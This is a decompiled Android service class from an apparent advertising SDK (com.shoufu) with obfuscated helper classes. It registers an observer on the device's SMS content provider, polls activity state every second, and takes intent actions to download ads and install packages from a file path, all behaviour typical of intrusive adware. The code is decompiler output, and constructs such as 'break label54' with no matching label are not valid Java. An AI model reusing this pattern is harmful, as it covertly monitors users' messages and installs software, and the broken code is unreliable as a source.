package com.shoufu.service;

import android.app.ActivityManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;
import com.shoufu.entity.response.Ad;
import com.shoufu.lib.ak;
import com.shoufu.lib.al;
import com.shoufu.lib.am;
import com.shoufu.lib.bj;
import com.shoufu.lib.by;
import com.shoufu.lib.bz;
import com.shoufu.lib.cw;
import com.shoufu.lib.dn;
import com.shoufu.lib.dv;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Timer;
import java.util.TimerTask;

public class AppService
  extends Service
{
  TimerTask a = new a(this);
  private Context b;
  private ActivityManager c;
  private Timer d;
  private bz e;
  
  public AppService() {}
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    this.b = this;
    this.c = ((ActivityManager)this.b.getSystemService("activity"));
    this.d = new Timer();
    this.d.schedule(this.a, 0L, 1000L);
    ContentResolver localContentResolver = getContentResolver();
    this.e = new bz(this, localContentResolver, new by(this));
    localContentResolver.registerContentObserver(Uri.parse("content://sms"), true, this.e);
  }
  
  public void onDestroy()
  {
    super.onDestroy();
    this.d.cancel();
    getContentResolver().unregisterContentObserver(this.e);
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    if ((paramIntent != null) && (paramIntent.getStringExtra("action") != null))
    {
      if (!"install".equals(paramIntent.getStringExtra("action"))) {
        break label54;
      }
      if (dv.a != null) {
        dv.a.a();
      }
      al.a(this.b, paramIntent.getStringExtra("filepath"));
    }
    for (;;)
    {
      return 1;
      label54:
      if ("download".equals(paramIntent.getStringExtra("action")))
      {
        if (dv.a != null) {
          dv.a.a();
        }
        paramIntent = (Ad)paramIntent.getSerializableExtra("ad");
        if (paramIntent != null) {
          new b(this, paramIntent).start();
        }
      }
      else if ("start".equals(paramIntent.getStringExtra("action")))
      {
        if (cw.h(this.b) > 0L)
        {
          long l1 = cw.h(this.b);
          long l2 = cw.g(this.b);
          cw.i(this.b);
          cw.b(this.b, 0L);
          paramIntent = new ArrayList();
          Calendar localCalendar = Calendar.getInstance();
          localCalendar.setTimeInMillis(l1);
          paramIntent.add(new bj(am.a(localCalendar, "yyyy-MM-dd HH:mm:ss"), l2 / 1000L));
          dn.a(this.b, paramIntent);
        }
        else
        {
          cw.i(this.b);
        }
      }
    }
  }
}
